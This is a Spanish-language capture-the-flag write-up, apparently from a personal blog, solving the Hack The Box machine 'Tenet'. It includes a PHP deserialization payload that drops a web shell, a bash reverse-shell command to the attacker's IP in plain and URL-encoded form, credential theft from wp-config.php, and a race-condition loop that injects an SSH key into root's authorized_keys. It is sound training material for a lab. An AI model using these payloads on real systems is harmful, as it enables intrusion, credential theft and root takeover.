---
layout: single
title: Tenet - Hack The Box
excerpt: "Tenet es una máquina de nivel medio con Sistema Operativo Linux, que contiene un servidor web Apache que aloja un Wordpress. El acceso al sistema se logra mediante la explotación de una vulnerabilidad insecure deserialisation. Una vez dentro, se logra obtener credenciales de una base de datos, lo que permite la migración a un usuario con mayores privilegios. Finalmente, se descubre que aprovechando una vulnerabilidad de race condition, un script bash con permisos de root, ejecutable mediante sudo, facilita la escalada de privilegios al permitir la escritura de claves SSH propias."
date: 2024-02-23
classes: wide
header:
  teaser: /assets/images/HTB/writeup-tenet/Tenet.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Medium
  - CFTs
tags:
  - Pentesting
  - Linux
  - WordPress
  - Information Disclosure
  - Insecure deserialization
  - Race Condition
  - SSH Key
---

![](/assets/images/HTB/writeup-tenet/Tenet.png)

[Download Write-Up](https://github.com/0mariano/0mariano.github.io/blob/master/PDFs%20and%20tex/Write-Up/MAA-Write-Up-Tenet.pdf)

---

# **Índice**

1. [Introducción](#introduccion)
  * [Scope](#scope)
  * [Metodologia Aplicada](#metodologia-aplicada)
2. [Reconocimiento - Enumeración](#reconocimiento-enumeracion)
  * [Uso de la Herramienta Nmap](#uso-de-la-herramienta-nmap)
  * [Puerto 80](#puerto-80)
  * [Uso de la Herramienta Gobuster](#uso-de-la-herramienta-gobuster)
  * [Virtual Hosting](#virtual-hosting)
3. [Análisis de Vulnerabilidades](#analisis-de-vulnerabilidades)
  * [Information Disclosure](#information-disclosure)
  * [Uso de la Herramienta Wfuzz](#uso-de-la-herramienta-wfuzz)
  * [Insecure Deserialization](#insecure-deserialization)
4. [Explotación](#explotacion)
  * [Remote Code Execution (RCE) - via Insecure Deserialization](#remote-code-execution-rce-via-insecure-deserialization)
  * [Revshell](#revshell)
  * [Credenciales en texto Claro](#credenciales-en-texto-claro)
5. [Escalada de Privilegios](#escalada-de-privilegios)
  * [Race Condition](#race-condition) 
6. [Conclusión Final](#conclusion-final)
7. [Apéndice I Links de Referencia](#apendice-i-links-de-referencia)
  * [Herramientas Utilizadas en la Auditoria](#herramientas-utilizadas-en-la-auditoria)
  * [Documentación](#documentacion) 

---

# Introducción 📄 [#](#introduccion) {#introduccion}
En el presente Write Up explicare los pasos para resolver la máquina <a href="https://app.hackthebox.com/machines/Tenet" style="color:orange"><strong>**Tenet**</strong></a> de la plataforma [HackTheBox](https://hackthebox.com).
Tenet es una máquina de nivel medio con Sistema Operativo Linux, que contiene un servidor web Apache que aloja un Wordpress. El acceso al sistema se logra mediante la explotación de una vulnerabilidad insecure deserialisation. Una vez dentro, se logra obtener credenciales de una base de datos, lo que permite la migración a un usuario con mayores privilegios. Finalmente, se descubre que aprovechando una vulnerabilidad de race condition, un script bash con permisos de root, ejecutable mediante sudo, facilita la escalada de privilegios al permitir la escritura de claves SSH propias.

## Scope 🎯 [#](#scope) {#scope}
El scope de esta máquina fue definida como la siguiente.

| **Servidor Web / Direcciónes IPs / Hosts / URLs** |           **Descripción**           | **Subdominios** |
|:-------------------------------------------------:|:-----------------------------------:|:---------------:|
|                   10.129.4.206                   | Dirección IP de la máquina Tenet |      Todos      |

## Metodologia Aplicada 📦​​📚​​ [#](#metodologia-aplicada) {#metodologia-aplicada}
* Enfoque de prueba: En el proceso de pruebas de seguridad, se optó por un enfoque gray-box, lo que significó que se tenía un nivel de acceso parcial a la infraestructura y el sistema objetivo.
* Las etapas aplicadas para esta auditoria fueron las siguientes:

![](/assets/images/HTB/writeup-tenet/Etapas-pentest.png)

# Reconocimiento - Enumeración 🔍 [#](#reconocimiento-enumeracion) {#reconocimiento-enumeracion}
## Uso de la Herramienta Nmap 👁️ [#](#uso-de-la-herramienta-nmap) {#uso-de-la-herramienta-nmap}
Primero, realizamos un escaneo con ayuda de la herramienta Nmap en busca de puertos abiertos.

```bash
# Primer escaneo.
--------------------------------------------------------------
nmap -p- --open --min-rate 5000 10.129.4.206
```

|    **Parámetro**    |                                   **Descripción**                                   |
|:-------------------:|:-----------------------------------------------------------------------------------:|
|       **-p-**       |                              Escanea los 65535 puertos.                             |
|      **\--open**     |                          Muestra solo los puertos abiertos.                         |
| **\--min-rate 5000** |   Establece la velocidad mínima de envío de paquetes a 5000 paquetes por segundo.   |

Y obtenemos lo siguiente:

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/nmap_1.png" alt="Primer escaneo.">
</div>

Para el puerto <span style="color:green"> 22 </span>, este puerto está asociado al servicio **SSH** (Secure Shell), que es un protocolo de red que permite a los usuarios acceder y controlar de forma remota una máquina a través de una conexión cifrada. 

Para el puerto <span style="color:orange"> 80 </span>,  este puerto está asociado al protocolo **HTTP** (Hypertext Transfer Protocol), utilizado para la transferencia de datos. 

Se procedió a realizar otro escaneo con los scripts default de nmap, también especificando la versión.

```bash
# Segundo escaneo.
--------------------------------------------------------------
nmap -sC -sV -p22,80 10.129.4.206
```

| **Parámetro** |                                   **Descripción**                                   |
|:-------------:|:-----------------------------------------------------------------------------------:|
|    **-sC**    |                   Realiza un escaneo con los scripts por defecto.                   |
|    **-sV**    | Determina la versiones de los servicios que se ejecutan en los puertos encontrados. |
|     **-p**    |                      Especifica los puertos que se escanearán.                      |

Bueno, conocemos la versión de _**SSH**_, que es bastante antigua, y la versión de _**Apache**_.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/nmap_2.png" alt="Resultado del segundo escaneo.">
</div>

## Puerto 80 🚪 [#](#puerto-80) {#puerto-80}
Vamos a ver qué hay detras de ese puerto 80.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/apache-template.png" alt="Template de Apache.">
</div>

Solo hay un template de apache.

## Uso de la Herramienta Gobuster 🔎🌐 [#](#uso-de-la-herramienta-gobuster) {#uso-de-la-herramienta-gobuster}
Vamos a enumerar los directorios, para eso, usaremos gobuster.

```bash
# Comandos de gobuster utilizados.
--------------------------------------------------------------
gobuster dir -u http://10.129.4.206 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

| **Parámetro** |                                   **Descripción**                                   |
|:-------------:|:-----------------------------------------------------------------------------------:|
|    **dir**    |                 Indica a gobuster que debe realizar una búsqueda de directorios.                   |
|    **-u**    | Especifica la UR a la que se dirigirá gobuster para realizar la enumeración de directorios.  |
|    **-w**    |                     Especifica la ruta del archivo de las palabras que se utilizará para realizar la enumeración de directorios.   |

Ok, hay un directorio en el servidor llamado **WordPress**. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/gobuster.png" alt="Enumeración de directorios.">
</div>

## Virtual Hosting 🏘️​ [#](#virtual-hosting) {#virtual-hosting}
Bueno, si ingresamos al directorio, vemos que se ve bastante mal. Esto se debe a que se está produciendo **Virtual Hosting**.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/wordpress-directory.png" alt="Virtual Hosting.">
</div>

Si revisamos el código fuente, vemos varios dominios. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/código-fuente-wordpress.png" alt="Código fuente.">
</div>

Claro, para solucionar este pequeño problema y visualizar correctamente la página web, debemos agregar el dominio **tenet.htb** al archivo **/etc/hosts**

```bash
# Agregando dominio al archivo /etc/hosts
--------------------------------------------------------------
sudo nano /etc/hosts
          
10.129.4.206 tenet.htb
```

Esto hará que la IP apunte al dominio. ahora, cuando ingresemos al dominio, no tendremos problemas.  

Una vez dentro, enumeramos las tecnologías con **Wappalyzer** gy verificamos si efectivamente hay un **CMS** (Content Management System - Sistema de Gestión de Contenidos) de WordPress. Observamos **PHP**, que obviamente corresponde a WordPress, una database **MySQL** y el tema que está empleando WordPress. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/wappalyzer.png" alt="Enumeración de tecnologias con Wappalyzer.">
</div>


# Análisis de Vulnerabilidades ​🔬​ [#](#analisis-de-vulnerabilidades) {#analisis-de-vulnerabilidades}
## Information Disclosure 🗣️​ [#](#information-disclosure) {#information-disclosure}
Revisando la página web, vemos tres publicaciones y una de ellas tiene el título **Migration**. Si entramos en ese post, nos informan sobre una migración de datos y nos piden paciencia, ya que un desarrollador está a cargo de ello. Sin embargo, si miramos más abajo, encontramos un comentario de un usuario llamado **neil**, quien pregunta si eliminaron el archivo **sator.php** y su correspondiente **backup**. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/migration.png" alt="Information Disclusure.">
</div>

Bueno, bueno, bueno, esto me hace suponer que el developer neil ha cometido un error, ya que ha divulgado información que supuestamente nadie debería saber. 

Luego de un tiempo (me volví loco buscando el archivo sator.php en la ruta http://tenet.htb/sator.php), me olvidé de que la máquina aplica virtual hosting. Entonces, lo que hice fue agregar el subdominio sator.tenet.htb al archivo /etc/hosts 

```bash
# Agregando subdominio al archivo /etc/hosts
--------------------------------------------------------------
sudo nano /etc/hosts
          
10.129.4.206 tenet.htb sator.tenet.htb
```

Ahora podemos acceder al archivo sator.php sin problemas. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/sator-tenet-htb.png" alt="Archivo sator.php">
</div>

Después me di cuenta de que también podemos ingresar desde la IP, sin agregar el subdominio al archivo /etc/hosts 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/ip-sator-tenet-htb.png" alt="Ingresando al archivo sator.php desde la IP.">
</div>

## Uso de la Herramienta Wfuzz 📂🔍 [#](#uso-de-la-herramienta-wfuzz) {#uso-de-la-herramienta-wfuzz}
Usaré wfuzz para saber cuál es la extensión del archivo de backup. Para ello, utilizaré el siguiente comando.  

```bash
# Comandos utilizados para realizar fuzzing con wfuzz
--------------------------------------------------------------
wfuzz -c --hc=404 -z file,extension.txt http://sator.tenet.htb/sator.php.FUZZ
```

| **Parámetro** |                                   **Descripción**                                   |
|:-------------:|:-----------------------------------------------------------------------------------:|
|    **-c**    |                   Habilita la coloración en la salida de wfuzz, lo que facilita la identificación visual de diferentes tipos de respuestas.                     |
|    **--hc=404**    | La opción --hc significa "hide code" y oculta las respuestas que tienen el código de estado 404.  |
|     **-z file**    |                      Este parámetro indica que wfuzz debe utilizar una lista de palabras contenida en un archivo de texto.                       |

Como resultado, el archivo de respaldo tiene la extensión **.bak**

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/wfuzz.png" alt="Fuzzing con wfuzz.">
</div>

Si ingresamos a la ruta, vemos que se nos descarga un archivo que contiene el siguiente código PHP. 

```php
# Código php
--------------------------------------------------------------
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this >data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>
```

## Insecure Deserialization 🔄🔓 [#](#insecure-deserialization) {#insecure-deserialization}
Aquí vemos cosas interesantes, pero primero debemos tener en claro dos conceptos fundamentales: 

1. <span style="color:red"> Serialización </span>: En este proceso, los objetos son convertidos en una secuencia de bytes, lo que los hace adecuados para ser almacenados en un archivo o transmitidos a través de una red. La serialización preserva la estructura y el estado del objeto original. 

            ▪ Por ejemplo, si tienes un objeto en un lenguaje de programación como Python, puedes serializarlo para convertirlo en una cadena de bytes que pueda ser guardada en un archivo o transmitida a otro sistema. 

2. <span style="color:blue"> Deserialización </span>: Es el proceso inverso. Convierte la secuencia de bytes de vuelta en un objeto en memoria que puede ser utilizado por el programa. Esto es útil cuando necesitas recuperar datos previamente serializados, como al leer un archivo que contiene datos serializados o recibir datos a través de una red. 

Sé que la explicación puede resultar confusa, pero de igual manera dejaré documentación al final del Write-Up. 

Bien, ustedes podrían preguntar: ¿Pero Marian, qué tiene que ver esto con la máquina? Bueno, al observar el código, vemos que la función **unserialize** se encarga de deserializar los datos del usuario que le pasamos como al parámetro **arepo**, los cuales son guardados en la variable **input**. Esto es muy peligroso, ya que nunca debemos confiar en la entrada del usuario. Casi todas las vulnerabilidades que no han sido remediadas se deben a la falta de sanitización en la entrada del usuario. Por lo tanto, si un usuario ingresa datos serializados, estos serán deserializados mediante la función unserialize sin ningún tipo de sanitización. 

En consecuencia, este código es vulnerable a **insecure deserialization**.

## Explotación 💣​ [#](#explotacion) {#explotacion}
## Remote Code Execution (RCE) - via Insecure Deserialization ​👨‍💻​🔄🔓 [#](#remote-code-execution-rce-via-insecure-deserialization) {#remote-code-execution-rce-via-insecure-deserialization}
Entonces se me ocurrió crear un script para explotar esta vulnerabilidad, mediante variables públicas, creamos un archivo php que contenga datos serializados. Esta data sería una llamada al sistema con el parámetro **cmd**, lo que me permitiría ejecutar cualquier comando, por eso no utilizo el 

```php
# No utilizo este comando porque, con este estaría ejecutando solamente whoami, en vez de pasarle yo el comando que quiera las veces que quiera.
--------------------------------------------------------------
'<?php system(whoami); ?>'
```
Por ende aqui esta el comando que utilizare:

```php
# Script en php
--------------------------------------------------------------
<?php

class DatabaseExport {

    public $user_file = "rce.php";
    public $data = '<?php system($_REQUEST["cmd"]); ?>';

}

$script = new DatabaseExport;
echo serialize($script);

?>
```

Una vez creado el archivo y ejecutado, nos genera el siguiente objeto serializado: 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/object_serializado.png" alt="Objeto serializado en formato URL encode.">
</div>

Antes de ingresarlo en la URL, debemos codificarlo. Para eso, vamos a usar CyberChef.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/cyberchef.png" alt="Objeto serializado en formato URL encode.">
</div>

Una vez enviado el objeto serializado, nos devuelve un mensajeque indica que la base de datos se ha actualizado.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/database-update.png" alt="Mensaje database update.">
</div>

Procedemos a probar cualquier comando para ver si tenemos RCE. Para ello, apuntamos al archivo que creamos y al parámetro cmd. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/rce.png" alt="Comandos para confirmar rce.">
</div>

Y si tenemos el RCE, pero un consejito par aque se vea mejor, en estos caso precionamos **CTRL+U** y apreciaremos la salida mucho mejor.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/ctrl+u.png" alt="CTRL+U para visualizar mejor la salida.">
</div>

## Revshell 💻🔌 [#](#revshell) {#revshell}
Bueno, vemos que somos el usuario www-data, pero para examinar mejor el contenido, nos enviaremos una revshell. Si ya tenemos RCE, ¿por qué no hacerlo? Para ello, abriremos **BurpSuite** y interceptaremos la petición para agregar el siguiente comando y establecer una reverse shell. 

> bash -c "bash -i >& /dev/tcp/10.10.14.92/6162 0>&1"

Pero este comando debe ser codificado en URL. Aquí está:

> %62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%39%32%2f%36%31%36%32%20%30%3e%26%31%22

Enviamos la petición y obtenemos la revshell.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/rvshell.png" alt="Revshell obtenida.">
</div>

Antes de seguir, voy a estabilizar la shell, esto permitira hacer **CTRL+C**, **CTRL+L** sin que quitee la revshell.

A continuación, dejo los pasos de los comandos: 

```bash
# Tratamiento de la tty
--------------------------------------------------------------
script /dev/null -c bash

CTRL + Z

stty raw -echo; fg

reset xterm

export TERM=xterm

export SHELL=bash
```

Una vez establecida la shell, si vamos a la ruta **/home/neil** y queremos visualizar la flag, no podemos porque no tenemos permisos. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/user-flag-denied.png" alt="Flag sin permisos de lectura.">
</div>

## Credenciales en Texto Claro 🔤 [#](#credenciales-en-texto-claro) {#credenciales-en-texto-claro}
Bien, para eso volvamos a la ruta inicial, me refiero a esta **_/var/www/html/wordpress_** , donde se encuentra el archivo **wp-config.php** que suele tener credenciales de la **database** en **texto claro**.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/wp-config-php.png" alt="Archivo wp-config.php.">
</div>

Procedemos a leer el contenido y encontramos las credenciales del usuario **neil** y su **password**.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/cat-wp-config-php.png" alt="Credenciales del usuario neil.">
</div>

Procedemos a cambiar de usuario para verificar si las credenciales funcionan. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/su-neil.png" alt="Cambio de usuario.">
</div>

Como funcionó y ahora que recuerdo que el ssh está abierto, así que mejor me conecto por ahí. Funcionó correctamente y ya tenemos acceso a la primera flag. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/flag-user-censured.png" alt="Conexión por ssh y flag del user.">
</div>

# Escalada de Privilegios 📈​ [#](#escalada-de-privilegios) {#escalada-de-privilegios}
Bueno, ya que tenemos acceso a la máquina, solo quedaría explotar una última vulnerabilidad y escalar privilegios.
Para ello, se me ocurrió ejecutar sudo -l para ver qué archivos puedo ejecutar como usuario root sin proporcionar la contraseña de dicho usuario.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/sudo-l.png" alt="Script ejecutable como usuario root.">
</div>

Si miramos el contenido del script vemos lo siguiente:

```bash
# Script en bash
--------------------------------------------------------------
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

## Race Condition ⏱️🏁​ [#](#race-condition) {#race-condition}
Interesante, lo que básicamente sucede es que crea un archivo **ssh-XXXXXXXX** en el directorio **/tmp**, el cual contiene la **clave pública SSH del usuario root**. Luego, agrega esta clave al archivo **authorized_keys** en el directorio **/root/.ssh/** y verifica si la clave se ha agregado correctamente. Una vez **agregada** al **archivo /root/.ssh/authorized_keys**, podremos ingresar por SSH como usuario **root sin necesidad** de **proporcionar** la **password**. 

Entonces aquí es donde se produce la vulnerabilidad de la race condition. ¿Por qué? Es sencillo: si ejecutamos el script varias veces, nos mostrará que se crea un archivo diferente en cada ejecución. Cada archivo contiene la clave pública SSH del usuario root. Antes de agregarlo al directorio **/root/.ssh/authorized_keys**, se verifica que se haya agregado correctamente y luego se borra. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/ejecucion-de-mktemp.png" alt="Ejecución del script.">
</div>

Es por eso que, si sabemos que en la ruta **/tmp/ssh** se crea un archivo temporal que contiene la clave pública, se me ocurre tratar de detectar el archivo, eliminarlo y reemplazar la clave por **mi clave pública SSH de mi máquina atacante**. De esta manera, cuando se añada mi clave al directorio **/root/.ssh/authorized_keys**, podré conectarme como root por SSH sin necesidad de proporcionar una contraseña. Hay que ser rápidos ya que es un archivo temporal y luego se elimina. 

Bueno, para explotar la race condition, debemos generar una clave pública SSH. Lo haremos con la herramienta **ssh-keygen**. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/ssh-keygen.png" alt="Generación de claves ssh.">
</div>

Una vez creada la clave pública y la clave privada, crearemos un script en bash que será un bucle donde sobrescribirá el archivo con mi clave SSH. En el script utilizaremos la clave pública. por favor, no compartan la clave privada, ya que esta debe ser conocida solo por nosotros mismos. 

```bash
# Script en bash
--------------------------------------------------------------
while true; 

do for 

privsec 

in /tmp/ssh-*; do 

echo 

"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXDrW7EhWE9YZiN7Q+5FBcYjyFjOPL26HTvEhYwaY6wPtnGoJUQM1jJG6t8dKxybU3jJrcCU4KF7QMeDFL35OI9KJKezV5nkIMSVrUR5EEPaYF2vytky/NKPVfGaw+rMbC2yMAF9paZBZl5tdFM05fPPpiJRLG8oOhFKvU6083s64WIBYcpv1F1TG32td/X9JdLBLAAubDr0sLOZ6+ACCXJfbKAyh9DgnUSPOjdMStlPkTkWtLV6x1Gvzj6FyRpMN77aYVs1E+e6liSKs7EwUQ1W99z2dmgd6E8VEtbV9q55x/7ZWGpwyj/iNCNMhR7dUZJ7IkplJkITVyDIqCskWPDBre2RNgNpPpGvdRZUEqv6VWBUpnNK81/1FDXdUVB0+qstxt189gDGU2MZLDHJtotgwR9j+VE+/36H/5y2V7bhzzRL0SBF91DDgWsd79Ih0MzZ4LKqq3buwCNff//V3WeNKy9BKPtFf8FuxSJO+l6ZFz7Ph5dD8z6rtp4aaSpBM= root@kali" > $privsec ; done; done
```

Ejecutamos el bucle, luego ejecutamos el script con sudo. Después de un tiempo (tengamos en cuenta que se trata de un race condition y puede llevar algún tiempo), consigamos la conexión por SSH como usuario root. Si no consiguen acceso por ssh como usuario root a la primera, no se frustren y sigan intentándolo hasta lograr la conexión. 

Me costó un poco, pero al final conseguí la conexión por ssh como usuario root. 

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/root.png" alt="Conexión por ssh como usuario.">
</div>

Bueno solo falta ver la flag de root.

<div align="center">
  <img src="/assets/images/HTB/writeup-tenet/flag-root-censured.png" alt="Flag de root.">
</div>

# Conclusión Final 💬​ [#](#conclusion-final) {#conclusion-final}
La máquina resultó bastante sencilla para obtener una reverse shell, pero luego tuve dificultades con la escalada de privilegios. El race condition fue un desafío y también me aburrió un poco decidir cómo realizar la escalada de privilegios. A pesar de eso, la máquina fue muy interesante, abordando varias vulnerabilidades: 

* Information Disclosure
* Remote Code Execution (RCE) - via Insecure Deserialization
* Race Condition

# Apéndice I Links de Referencia 📎​ [#](#apendice-i-links-de-referencia) {#apendice-i-links-de-referencia}
## Herramientas Utilizadas en la Auditoria 🛠️​ [#](#herramientas-utilizadas-en-la-auditoria) {#herramientas-utilizadas-en-la-auditoria}
* [Nmap:](https://nmap.org) [https://nmap.org](https://nmap.org) - [https://www.kali.org/tools/nmap](https://www.kali.org/tools/nmap) → Uso de nmap para el escaneo de puertos.
* [Gobuster:](https://www.kali.org/tools/gobuster) [https://www.kali.org/tools/gobuster](https://www.kali.org/tools/gobuster) → Uso de gobuster para enumerar directorios. 
* [Wappalyzer:](https://www.wappalyzer.com) [https://www.wappalyzer.com](https://www.wappalyzer.com) →  Uso de wappalyzer para enumerar tecnologias.
* [Wfuzz:](https://www.kali.org/tools/wfuzz) [https://www.kali.org/tools/wfuzz](https://www.kali.org/tools/wfuzz) → Uso de wfuzz para realizar fuzzing de extensiónes.
* [CyberChef:](https://gchq.github.io/CyberChef) [https://www.kali.org/tools/wfuzz](https://www.kali.org/tools/wfuzz) → Uso de CyberChef para encodear en URL la revshell.
* [BurpSuite Community Edition:](https://portswigger.net/burp/communitydownload ) [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload) → Uso de BurpSuite para interceptar peticiones.

## Documentación ​📰​​ [#](#documentacion) {#documentacion}
* [PortSwigger: Insecure deserialization](https://portswigger.net/web-security/deserialization) [https://portswigger.net/web-security/deserialization](https://portswigger.net/web-security/deserialization) 
* [OWASP: Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) [https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
* [How to Use ssh-keygen to Generate a New SSH Key?:](https://www.ssh.com/academy/ssh/keygen) [https://www.ssh.com/academy/ssh/keygen](https://www.ssh.com/academy/ssh/keygen)
